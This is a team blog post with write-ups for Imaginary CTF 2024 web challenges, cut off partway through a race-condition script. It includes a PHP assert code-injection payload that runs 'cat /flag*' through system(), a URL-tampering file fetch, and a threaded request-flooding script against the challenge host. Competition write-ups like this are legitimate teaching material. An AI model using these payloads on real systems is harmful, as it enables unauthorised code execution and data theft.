<!DOCTYPE html>
<html lang=en>
<head>
    <!-- so meta -->
    <meta charset="utf-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="HandheldFriendly" content="True">
    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=5" />
    <meta name="description" content="Before allRank 61 &#x2F; 1457é€™æ˜¯æˆ‘ç¬¬ä¸€æ¬¡è·Ÿå»ºç«‹çš„ç¤¾åœ˜æˆ°éšŠ(ICEDTEA)æ‰“æ¯”è³½æ•´é«”é…åˆåº¦å¾ˆé«˜ï¼Œæ‰“èµ·ä¾†ä¹Ÿå¾ˆèˆ’æœowob (é›–ç„¶å¤§éƒ¨åˆ†ä¸æ˜¯æˆ‘å€‘å­¸æ ¡ã„‰)å¾ˆå–œæ­¡é€™ç¨®æ„Ÿè¦º ! Write UpWEBreadme solver Elliot_404 https:&#x2F;&#x2F;cybersharing.net&#x2F;s&#x2F;67af3fd941707117    æŒ‰ä¸‹Load Previewæ¥è‘—æ‰“é–‹">
<meta property="og:type" content="article">
<meta property="og:title" content="2024 Imaginary CTF Write Up by ICEDTEA">
<meta property="og:url" content="http://wha13.github.io/2024/07/25/2024-imaginary-ctf/index.html">
<meta property="og:site_name" content="Whale120&#39;s Blog">
<meta property="og:description" content="Before allRank 61 &#x2F; 1457é€™æ˜¯æˆ‘ç¬¬ä¸€æ¬¡è·Ÿå»ºç«‹çš„ç¤¾åœ˜æˆ°éšŠ(ICEDTEA)æ‰“æ¯”è³½æ•´é«”é…åˆåº¦å¾ˆé«˜ï¼Œæ‰“èµ·ä¾†ä¹Ÿå¾ˆèˆ’æœowob (é›–ç„¶å¤§éƒ¨åˆ†ä¸æ˜¯æˆ‘å€‘å­¸æ ¡ã„‰)å¾ˆå–œæ­¡é€™ç¨®æ„Ÿè¦º ! Write UpWEBreadme solver Elliot_404 https:&#x2F;&#x2F;cybersharing.net&#x2F;s&#x2F;67af3fd941707117    æŒ‰ä¸‹Load Previewæ¥è‘—æ‰“é–‹">
<meta property="og:locale" content="en_US">
<meta property="og:image" content="https://hackmd.io/_uploads/SJWs3cJKA.png">
<meta property="og:image" content="https://hackmd.io/_uploads/rJaUcxpu0.png">
<meta property="og:image" content="https://hackmd.io/_uploads/ry1N5ea_0.png">
<meta property="og:image" content="https://hackmd.io/_uploads/HywQqg6u0.png">
<meta property="og:image" content="https://hackmd.io/_uploads/rJcUKyquC.png">
<meta property="og:image" content="https://hackmd.io/_uploads/S120woqdR.png">
<meta property="og:image" content="https://hackmd.io/_uploads/H1JoFjq_A.png">
<meta property="og:image" content="https://hackmd.io/_uploads/BkO2toquR.png">
<meta property="og:image" content="https://hackmd.io/_uploads/B1KpKi5OA.png">
<meta property="og:image" content="https://hackmd.io/_uploads/HJHoIM0dA.png">
<meta property="og:image" content="https://hackmd.io/_uploads/ryWyKfRdR.png">
<meta property="og:image" content="https://hackmd.io/_uploads/SJCUFGA_A.png">
<meta property="og:image" content="https://hackmd.io/_uploads/rJViTfAuC.png">
<meta property="og:image" content="https://hackmd.io/_uploads/HkjnkmROA.png">
<meta property="og:image" content="https://hackmd.io/_uploads/HkYIqlA_A.png">
<meta property="og:image" content="https://hackmd.io/_uploads/SJf-5lRu0.png">
<meta property="og:image" content="https://hackmd.io/_uploads/BkHd5bRd0.png">
<meta property="og:image" content="https://hackmd.io/_uploads/Hyr7fGA_0.png">
<meta property="og:image" content="https://hackmd.io/_uploads/B1ic67Yu0.png">
<meta property="og:image" content="https://hackmd.io/_uploads/HymYpmtuR.png">
<meta property="og:image" content="https://hackmd.io/_uploads/BkYyC7F_A.png">
<meta property="og:image" content="https://hackmd.io/_uploads/SJMqD1YuA.png">
<meta property="og:image" content="https://hackmd.io/_uploads/BkbeFyFOC.png">
<meta property="og:image" content="https://hackmd.io/_uploads/SyETDyFdA.png">
<meta property="og:image" content="https://hackmd.io/_uploads/HkmRPJKuC.png">
<meta property="og:image" content="https://hackmd.io/_uploads/H1UsN_9_C.png">
<meta property="og:image" content="https://hackmd.io/_uploads/r1C34dq_R.png">
<meta property="og:image" content="https://hackmd.io/_uploads/ry87Bu9uR.png">
<meta property="og:image" content="https://hackmd.io/_uploads/Syj-HuqOA.png">
<meta property="og:image" content="https://hackmd.io/_uploads/BJCXeZFO0.png">
<meta property="og:image" content="https://hackmd.io/_uploads/ryuHquo_C.jpg">
<meta property="og:image" content="https://hackmd.io/_uploads/rkf8TdjdA.png">
<meta property="og:image" content="https://hackmd.io/_uploads/HyI5VcsOR.png">
<meta property="og:image" content="https://hackmd.io/_uploads/H16JcYodC.png">
<meta property="og:image" content="https://hackmd.io/_uploads/SklMcto_0.png">
<meta property="og:image" content="https://hackmd.io/_uploads/B1c37coO0.png">
<meta property="og:image" content="https://hackmd.io/_uploads/HkEUoKiOC.png">
<meta property="og:image" content="https://hackmd.io/_uploads/B14TCtjdC.png">
<meta property="og:image" content="https://hackmd.io/_uploads/ryMRAKi_0.png">
<meta property="og:image" content="https://hackmd.io/_uploads/rJAA0Ko_0.png">
<meta property="og:image" content="https://hackmd.io/_uploads/SJo9-5juA.png">
<meta property="og:image" content="https://hackmd.io/_uploads/rkwMx9jd0.png">
<meta property="og:image" content="https://hackmd.io/_uploads/H118gciOA.png">
<meta property="og:image" content="https://hackmd.io/_uploads/ryJhgcodA.png">
<meta property="og:image" content="https://hackmd.io/_uploads/SyQQ3KjuA.png">
<meta property="og:image" content="https://hackmd.io/_uploads/SkU03YoO0.png">
<meta property="og:image" content="https://hackmd.io/_uploads/H1CQ0tjOR.png">
<meta property="og:image" content="https://hackmd.io/_uploads/Byp30Ksd0.png">
<meta property="og:image" content="https://hackmd.io/_uploads/HkpDlciOR.png">
<meta property="og:image" content="https://hackmd.io/_uploads/HyeAR9i_C.jpg">
<meta property="og:image" content="https://hackmd.io/_uploads/SJL6PqoOR.png">
<meta property="og:image" content="https://hackmd.io/_uploads/HJVw5cj_R.png">
<meta property="og:image" content="https://hackmd.io/_uploads/SJaeRcoO0.jpg">
<meta property="og:image" content="https://hackmd.io/_uploads/SJfOaqouC.jpg">
<meta property="og:image" content="https://hackmd.io/_uploads/Bywiv1K_A.png">
<meta property="og:image" content="https://hackmd.io/_uploads/HJe2PJtOR.png">
<meta property="og:image" content="https://hackmd.io/_uploads/HknnvyKOC.png">
<meta property="og:image" content="https://hackmd.io/_uploads/Byb9U_Kd0.png">
<meta property="og:image" content="https://hackmd.io/_uploads/S1fpIdYuC.png">
<meta property="og:image" content="https://hackmd.io/_uploads/ryiWuut_A.png">
<meta property="og:image" content="https://hackmd.io/_uploads/BkFu_uKOC.jpg">
<meta property="og:image" content="https://hackmd.io/_uploads/H1D5uuY_C.png">
<meta property="og:image" content="https://hackmd.io/_uploads/H1Q47jcu0.png">
<meta property="article:published_time" content="2024-07-25T09:32:51.000Z">
<meta property="article:modified_time" content="2024-07-25T09:37:55.543Z">
<meta property="article:author" content="William Lin">
<meta property="article:tag" content="CTF">
<meta property="article:tag" content="Web Security">
<meta property="article:tag" content="Cryptography">
<meta property="article:tag" content="pwn">
<meta property="article:tag" content="vmem">
<meta property="article:tag" content="pkt">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="https://hackmd.io/_uploads/SJWs3cJKA.png">
    
    
      
        
          <link rel="shortcut icon" href="/images/favicon.ico">
        
      
      
        
          <link rel="icon" type="image/png" href="/images/favicon-192x192.png" sizes="192x192">
        
      
      
        
          <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png">
        
      
    
    <!-- title -->
    <title>2024 Imaginary CTF Write Up by ICEDTEA</title>
    <!-- async scripts -->
    <!-- Google Analytics -->


    <!-- Umami Analytics -->


    <!-- styles -->
    
<link rel="stylesheet" href="/css/style.css">

    <!-- persian styles -->
    
    <!-- rss -->
    
    
	<!-- mathjax -->
	
		<script type="text/x-mathjax-config">
		  MathJax.Hub.Config({
			tex2jax: {
			  skipTags: ['script', 'noscript', 'style', 'textarea', 'pre'],
			  inlineMath: [['$','$']]
			}
		  });
		</script>
		<script src='https://cdnjs.cloudflare.com/ajax/libs/mathjax/2.7.5/latest.js?config=TeX-MML-AM_CHTML' async></script>
	
<!-- hexo injector head_end start -->
<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/katex@0.12.0/dist/katex.min.css">

<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/hexo-math@4.0.0/dist/style.css">
<!-- hexo injector head_end end --><meta name="generator" content="Hexo 7.3.0"></head>

<body class="max-width mx-auto px3 ltr">
    
      <div id="header-post">
  <a id="menu-icon" href="#" aria-label="Menu"><i class="fa-solid fa-bars fa-lg"></i></a>
  <a id="menu-icon-tablet" href="#" aria-label="Menu"><i class="fa-solid fa-bars fa-lg"></i></a>
  <a id="top-icon-tablet" href="#" aria-label="Top" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fa-solid fa-chevron-up fa-lg"></i></a>
  <span id="menu">
    <span id="nav">
      <ul>
        <!--
       --><li><a href="/">Home</a></li><!--
     --><!--
       --><li><a href="/about/">About</a></li><!--
     --><!--
       --><li><a href="/archives/">Writing</a></li><!--
     --><!--
       --><li><a href="/search/">Search</a></li><!--
     --><!--
       --><li><a href="/tags/">tags</a></li><!--
     -->
      </ul>
    </span>
    <br/>
    <span id="actions">
      <ul>
        
        <li><a class="icon" aria-label="Previous post" href="/2024/07/26/thm-yoto/"><i class="fa-solid fa-chevron-left" aria-hidden="true" onmouseover="$('#i-prev').toggle();" onmouseout="$('#i-prev').toggle();"></i></a></li>
        
        
        <li><a class="icon" aria-label="Next post" href="/2024/07/14/airplane-thm/"><i class="fa-solid fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i></a></li>
        
        <li><a class="icon" aria-label="Back to top" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa-solid fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i></a></li>
        <li><a class="icon" aria-label="Share post" href="#"><i class="fa-solid fa-share-alt" aria-hidden="true" onmouseover="$('#i-share').toggle();" onmouseout="$('#i-share').toggle();" onclick="$('#share').toggle();return false;"></i></a></li>
      </ul>
      <span id="i-prev" class="info" style="display:none;">Previous post</span>
      <span id="i-next" class="info" style="display:none;">Next post</span>
      <span id="i-top" class="info" style="display:none;">Back to top</span>
      <span id="i-share" class="info" style="display:none;">Share post</span>
    </span>
    <br/>
    <div id="share" style="display: none">
      <ul>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=http://wha13.github.io/2024/07/25/2024-imaginary-ctf/"><i class="fab fa-facebook " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=http://wha13.github.io/2024/07/25/2024-imaginary-ctf/&text=2024 Imaginary CTF Write Up by ICEDTEA"><i class="fab fa-twitter " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=http://wha13.github.io/2024/07/25/2024-imaginary-ctf/&title=2024 Imaginary CTF Write Up by ICEDTEA"><i class="fab fa-linkedin " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=http://wha13.github.io/2024/07/25/2024-imaginary-ctf/&is_video=false&description=2024 Imaginary CTF Write Up by ICEDTEA"><i class="fab fa-pinterest " aria-hidden="true"></i></a></li>
  <li><a class="icon" href="mailto:?subject=2024 Imaginary CTF Write Up by ICEDTEA&body=Check out this article: http://wha13.github.io/2024/07/25/2024-imaginary-ctf/"><i class="fa-solid fa-envelope " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=http://wha13.github.io/2024/07/25/2024-imaginary-ctf/&title=2024 Imaginary CTF Write Up by ICEDTEA"><i class="fab fa-get-pocket " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=http://wha13.github.io/2024/07/25/2024-imaginary-ctf/&title=2024 Imaginary CTF Write Up by ICEDTEA"><i class="fab fa-reddit " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=http://wha13.github.io/2024/07/25/2024-imaginary-ctf/&title=2024 Imaginary CTF Write Up by ICEDTEA"><i class="fab fa-stumbleupon " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=http://wha13.github.io/2024/07/25/2024-imaginary-ctf/&title=2024 Imaginary CTF Write Up by ICEDTEA"><i class="fab fa-digg " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=http://wha13.github.io/2024/07/25/2024-imaginary-ctf/&name=2024 Imaginary CTF Write Up by ICEDTEA&description="><i class="fab fa-tumblr " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=http://wha13.github.io/2024/07/25/2024-imaginary-ctf/&t=2024 Imaginary CTF Write Up by ICEDTEA"><i class="fab fa-hacker-news " aria-hidden="true"></i></a></li>
</ul>

    </div>
    
    
      <div id="toc">
        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#Before-all"><span class="toc-number">1.</span> <span class="toc-text">Before all</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Write-Up"><span class="toc-number">2.</span> <span class="toc-text">Write Up</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#WEB"><span class="toc-number">3.</span> <span class="toc-text">WEB</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#readme"><span class="toc-number">3.1.</span> <span class="toc-text">readme</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#journal"><span class="toc-number">3.2.</span> <span class="toc-text">journal</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#The-Amazing-Race"><span class="toc-number">3.3.</span> <span class="toc-text">The Amazing Race</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#P2C"><span class="toc-number">3.4.</span> <span class="toc-text">P2C</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Crystals"><span class="toc-number">3.5.</span> <span class="toc-text">Crystals</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#CRYPTO"><span class="toc-number">4.</span> <span class="toc-text">CRYPTO</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#base64"><span class="toc-number">4.1.</span> <span class="toc-text">base64</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#integrity"><span class="toc-number">4.2.</span> <span class="toc-text">integrity</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#REVERSING"><span class="toc-number">5.</span> <span class="toc-text">REVERSING</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#unoriginal"><span class="toc-number">5.1.</span> <span class="toc-text">unoriginal</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#RUST"><span class="toc-number">5.2.</span> <span class="toc-text">RUST</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#bf"><span class="toc-number">5.3.</span> <span class="toc-text">bf</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#unconditional"><span class="toc-number">5.4.</span> <span class="toc-text">unconditional</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#PWN"><span class="toc-number">6.</span> <span class="toc-text">PWN</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#imgstore"><span class="toc-number">6.1.</span> <span class="toc-text">imgstore</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#FORENSICS"><span class="toc-number">7.</span> <span class="toc-text">FORENSICS</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#crash"><span class="toc-number">7.1.</span> <span class="toc-text">crash</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#bom"><span class="toc-number">7.2.</span> <span class="toc-text">bom</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#packed"><span class="toc-number">7.3.</span> <span class="toc-text">packed</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#routed"><span class="toc-number">7.4.</span> <span class="toc-text">routed</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#cartesian-1"><span class="toc-number">7.5.</span> <span class="toc-text">cartesian-1</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#cartesian-2"><span class="toc-number">7.6.</span> <span class="toc-text">cartesian-2</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#cartesian-3"><span class="toc-number">7.7.</span> <span class="toc-text">cartesian-3</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#dog-mom"><span class="toc-number">7.8.</span> <span class="toc-text">dog-mom</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#MISC"><span class="toc-number">8.</span> <span class="toc-text">MISC</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#sanity-check"><span class="toc-number">8.1.</span> <span class="toc-text">sanity-check</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#discord"><span class="toc-number">8.2.</span> <span class="toc-text">discord</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Locked"><span class="toc-number">8.3.</span> <span class="toc-text">Locked</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#sussy"><span class="toc-number">8.4.</span> <span class="toc-text">sussy</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#starship"><span class="toc-number">8.5.</span> <span class="toc-text">starship</span></a></li></ol></li></ol>
      </div>
    
  </span>
</div>

    
    <div class="content index py4 ">
        
        <article class="post h-entry" itemscope itemtype="http://schema.org/BlogPosting">
  <header>
    
    <h1 class="posttitle p-name" itemprop="name headline">
        2024 Imaginary CTF Write Up by ICEDTEA
    </h1>



    <div class="meta">
      <span class="author p-author h-card" itemprop="author" itemscope itemtype="http://schema.org/Person">
        <span class="p-name" itemprop="name">William Lin</span>
      </span>
      
    <div class="postdate">
      
        <time datetime="2024-07-25T09:32:51.000Z" class="dt-published" itemprop="datePublished">2024-07-25</time>
        
      
    </div>


      

      
    <div class="article-tag">
        <i class="fa-solid fa-tag"></i>
        <a class="p-category" href="/tags/CTF/" rel="tag">CTF</a>, <a class="p-category" href="/tags/Cryptography/" rel="tag">Cryptography</a>, <a class="p-category" href="/tags/Web-Security/" rel="tag">Web Security</a>, <a class="p-category" href="/tags/pkt/" rel="tag">pkt</a>, <a class="p-category" href="/tags/pwn/" rel="tag">pwn</a>, <a class="p-category" href="/tags/vmem/" rel="tag">vmem</a>
    </div>


    </div>
  </header>
  

  <div class="content e-content" itemprop="articleBody">
    <h2 id="Before-all"><a href="#Before-all" class="headerlink" title="Before all"></a>Before all</h2><p>Rank 61 &#x2F; 1457<br>é€™æ˜¯æˆ‘ç¬¬ä¸€æ¬¡è·Ÿå»ºç«‹çš„ç¤¾åœ˜æˆ°éšŠ(ICEDTEA)æ‰“æ¯”è³½<br>æ•´é«”é…åˆåº¦å¾ˆé«˜ï¼Œæ‰“èµ·ä¾†ä¹Ÿå¾ˆèˆ’æœowob (<del>é›–ç„¶å¤§éƒ¨åˆ†ä¸æ˜¯æˆ‘å€‘å­¸æ ¡ã„‰</del>)<br><img src="https://hackmd.io/_uploads/SJWs3cJKA.png" alt="image"><br>å¾ˆå–œæ­¡é€™ç¨®æ„Ÿè¦º !</p>
<h2 id="Write-Up"><a href="#Write-Up" class="headerlink" title="Write Up"></a>Write Up</h2><h2 id="WEB"><a href="#WEB" class="headerlink" title="WEB"></a>WEB</h2><h3 id="readme"><a href="#readme" class="headerlink" title="readme"></a>readme</h3><ul>
<li>solver Elliot_404<blockquote>
<p><a target="_blank" rel="noopener" href="https://cybersharing.net/s/67af3fd941707117">https://cybersharing.net/s/67af3fd941707117</a></p>
</blockquote>
</li>
</ul>
<p>æŒ‰ä¸‹Load Preview<br><img src="https://hackmd.io/_uploads/rJaUcxpu0.png" alt="image"><br>æ¥è‘—æ‰“é–‹é–‹ç™¼è€…å·¥å…·ï¼Œæ‰¾åˆ°å°æ‡‰çš„è«‹æ±‚<br><img src="https://hackmd.io/_uploads/ry1N5ea_0.png" alt="image"><br>æŠŠè¦æ±‚ç¶²å€çš„å¾Œé¢çš„readme.tar.gzæ”¹æˆflag.txtå³å¯æ‹¿åˆ°æª”æ¡ˆ<br><img src="https://hackmd.io/_uploads/HywQqg6u0.png" alt="image"><br><a target="_blank" rel="noopener" href="https://cybersharing.net/api/download/file/7a829a2b-4674-471a-9875-02691f5ce6c5/703dc4c6-7b06-4813-874a-857fc1ea4098/7aeb7c98-9bf5-44b3-9eb3-972f225a3576/flag.txt">https://cybersharing.net/api/download/file/7a829a2b-4674-471a-9875-02691f5ce6c5/703dc4c6-7b06-4813-874a-857fc1ea4098/7aeb7c98-9bf5-44b3-9eb3-972f225a3576/flag.txt</a><br>ä½†æ‰“é–‹æœƒç™¼ç¾é€™å¯¦éš›ä¸Šä¸æ˜¯.txtæª”ï¼Œæ‰€ä»¥å…ˆä¸Ÿé€²Linuxè£¡é¢æŸ¥çœ‹æª”æ¡ˆé¡å‹</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">wget https://cybersharing.net/api/download/file/7a829a2b-4674-471a-9875-02691f5ce6c5/703dc4c6-7b06-4813-874a-857fc1ea4098/7aeb7c98-9bf5-44b3-9eb3-972f225a3576/flag.txt</span><br><span class="line">file flag.txt</span><br></pre></td></tr></table></figure>
<p>ç™¼ç¾æ˜¯gzipæª”ï¼Œè§£å£“ç¸®å®ƒä¸¦ç¹¼çºŒæŸ¥çœ‹æª”æ¡ˆé¡å‹</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">mv</span> flag.txt flag.gz</span><br><span class="line">gzip -d flag.gz</span><br><span class="line">file flag</span><br></pre></td></tr></table></figure>
<p>ç™¼ç¾æ˜¯tarå£“ç¸®æª”ï¼Œè§£å£“ç¸®å®ƒ</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">tar -xvf flag</span><br></pre></td></tr></table></figure>
<p>åœ¨è§£å£“ç¸®å‡ºä¾†çš„æª”æ¡ˆä¸­æœ‰ä¸€å€‹åç‚ºflagçš„æª”æ¡ˆï¼ŒæŸ¥çœ‹å®ƒçš„å…§å®¹</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">cat</span> flag | grep ictf</span><br></pre></td></tr></table></figure>
<p>å ±éŒ¯äº†ï¼Œçµ‚ç«¯å›æ‡‰<code>grep: (standard input): binary file matches</code>ï¼Œæ–¼æ˜¯åŠ ä¸Š<code>-a</code>é¸é …ï¼Œé€™æœƒå¼·åˆ¶ grep è™•ç†äºŒé€²åˆ¶æ–‡ä»¶ç‚ºæ–‡æœ¬</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">cat</span> flag | grep -a ictf</span><br></pre></td></tr></table></figure>
<p>flagï¼š<code>ictf&#123;path_normalization_to_the_rescue&#125;</code></p>
<h3 id="journal"><a href="#journal" class="headerlink" title="journal"></a>journal</h3><ul>
<li>solver Whale120<br><strong>index.php</strong> <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;p&gt;Welcome to my journal app!&lt;/p&gt;&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;p&gt;&lt;a href=/?file=file1.txt&gt;file1.txt&lt;/a&gt;&lt;/p&gt;&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;p&gt;&lt;a href=/?file=file2.txt&gt;file2.txt&lt;/a&gt;&lt;/p&gt;&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;p&gt;&lt;a href=/?file=file3.txt&gt;file3.txt&lt;/a&gt;&lt;/p&gt;&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;p&gt;&lt;a href=/?file=file4.txt&gt;file4.txt&lt;/a&gt;&lt;/p&gt;&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;p&gt;&lt;a href=/?file=file5.txt&gt;file5.txt&lt;/a&gt;&lt;/p&gt;&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;p&gt;&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>])) &#123;</span><br><span class="line">  <span class="variable">$file</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>];</span><br><span class="line">  <span class="variable">$filepath</span> = <span class="string">&#x27;./files/&#x27;</span> . <span class="variable">$file</span>;</span><br><span class="line"></span><br><span class="line">  <span class="title function_ invoke__">assert</span>(<span class="string">&quot;strpos(&#x27;<span class="subst">$file</span>&#x27;, &#x27;..&#x27;) === false&quot;</span>) <span class="keyword">or</span> <span class="keyword">die</span>(<span class="string">&quot;Invalid file!&quot;</span>);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (<span class="title function_ invoke__">file_exists</span>(<span class="variable">$filepath</span>)) &#123;</span><br><span class="line">    <span class="keyword">include</span>(<span class="variable">$filepath</span>);</span><br><span class="line">  &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&#x27;File not found!&#x27;</span>;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;/p&gt;&quot;</span>;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
é€™æ˜¯php-7:aplineçš„ç’°å¢ƒï¼Œ<code>assert(&quot;strpos(&#39;$file&#39;, &#39;..&#39;) === false&quot;)</code>ä¸­å¸¶ä¾†äº†php code injectionçš„å¼±é»ã€‚<br>payload:<code>?file=%27.system(&quot;cat%20/flag*&quot;).%27</code></li>
</ul>
<h3 id="The-Amazing-Race"><a href="#The-Amazing-Race" class="headerlink" title="The Amazing Race"></a>The Amazing Race</h3><ul>
<li>solver Whale120<br>ä¸€å€‹èµ°è¿·å®®çš„éŠæˆ²ï¼Œå¿«é€Ÿcode reviewå°±å¯ä»¥ç™¼ç¾çµ‚é»å‘¨åœæ°¸é æœƒæœ‰éšœç¤™ç‰©ï¼Œä¸éæœ‰æ„Ÿè¦ºåˆ°race conditionçš„æ´ï¼Œæ‰€ä»¥å¯ä»¥ç”¨é¡ä¼¼åº•ä¸‹çš„è…³æœ¬(ç”¨threadingsåŠ é€Ÿ)åˆ·åˆ°å³ä¸‹è§’æ‹¿flag<br><img src="https://hackmd.io/_uploads/rJcUKyquC.png" alt="image"></li>
</ul>
<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> threading</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">url = <span class="string">&#x27;http://the-amazing-race.chal.imaginaryctf.org/move&#x27;</span></span><br><span class="line"></span><br><span class="line">params = &#123;</span><br><span class="line">    <span class="string">&#x27;id&#x27;</span>: <span class="string">&#x27;f09c7723-d4a5-4b84-9faf-69d6197807b0&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;move&#x27;</span>: <span class="string">&#x27;down&#x27;</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">send_request</span>():</span><br><span class="line">    response = requests.post(url, params=params)</span><br><span class="line">    <span class="built_in">print</span>(response.text)</span><br><span class="line"></span><br><span class="line">num_threads = <span class="number">50</span>  </span><br><span class="line"></span><br><span class="line">threads = []</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span 